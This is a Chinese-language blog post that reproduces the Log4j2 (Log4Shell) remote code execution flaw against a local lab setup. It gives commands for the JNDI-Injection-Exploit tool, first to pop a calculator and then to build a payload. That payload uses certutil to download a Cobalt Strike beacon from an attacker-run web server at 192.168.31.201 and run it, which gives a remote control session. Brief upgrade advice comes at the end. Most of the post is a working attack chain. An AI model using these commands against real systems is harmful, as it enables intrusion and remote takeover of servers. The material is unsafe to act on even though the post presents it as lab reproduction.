# Log4j2 RCE漏洞复现

<!--more-->
## 前言
Apache Log4j2是一款优秀的Java日志记录框架。近日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证， Apache Struts2，Apache Solr， Apache Druid， Apache Flink等均受影响。

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-1.png)



### 漏洞评级
|影响产品 | 漏洞类型 | 漏洞评级|
| --- | --- | --- |
| Apache Log4j | 远程代码执行漏洞 | 严重 |


### 漏洞复现

首先去[GitHub](https://github.com/y35uishere/apache-log4j-poc.git)下载漏洞poc代码环境，使用IDEA加载项目文件

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-2.png)

打开项目文件src/main/java/log4j
在其中添加一行代码

```java
System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
```

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-3.png)  

接着去[GitHub](https://github.com/welk1n/JNDI-Injection-Exploit/releases)上下载*JNDI*注入工具  

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-4.png)



### 生成EXP

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A "192.168.31.201"
```

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-5.png)


将生成的EXP代码复制到漏洞POC代码中  

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-6.png)

### 运行POC
点击IDEA工具栏*运行*  
![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-7.png)  

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-8.png)  


成功弹出计算器！漏洞利用成功！  

### 反弹Shell上线CS

运行CobaltStrike teamserver  

```bash
teamserver.bat 192.168.31.201 123456
```

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-9.png)  

打开CobaltStrike连接  

新建监听器保存  

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-10.png)  


点击*攻击* --> *生成后门* --> *Windows可执行程序Stageless*  

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-11.png)  

选择生成的监听器，输出格式exe  

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-12.png)  

点击保存  

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-13.png)  

### 启动Web服务

在生成的exe payload目录执行：  

```
python -m http.server 8080
```

浏览器访问验证  

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-14.png)  

### 构造CS上线payload

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "certutil -urlcache -split -f http://192.168.31.201:8080/beacon.exe C:\Users\a.exe&&C:\Users\a.exe" -A "192.168.31.201"
```

将生成好的payload粘贴到POC代码中  

![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-15.png)  

点击运行



![](https://image-ghfh.oss-cn-beijing.aliyuncs.com/img/log4j2-16.png)

成功上线！

### 演示视频

{{< bilibili BV1sD4y1F7vc >}}

### 漏洞缓解措施

（1）尽快升级至最新版本

https://github.com/apache/logging-log4j2/ ;  

尽快升级Apache Log4j2所有相关应用到最新的log4j-2.15.0-rc2版本

https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2

(2)安装杀毒软件更新最新补丁程序

### 总结

本篇文章介绍了Apache Log4j2 远程代码执行漏洞的风险及漏洞利用过程，以简单直观的过程告知用户其危害以及防护措施。



### 相关链接

https://mp.weixin.qq.com/s/AuBchaUvFw2pisVw6rNX5A



https://github.com/y35uishere/apache-log4j-poc



https://github.com/welk1n/JNDI-Injection-Exploit


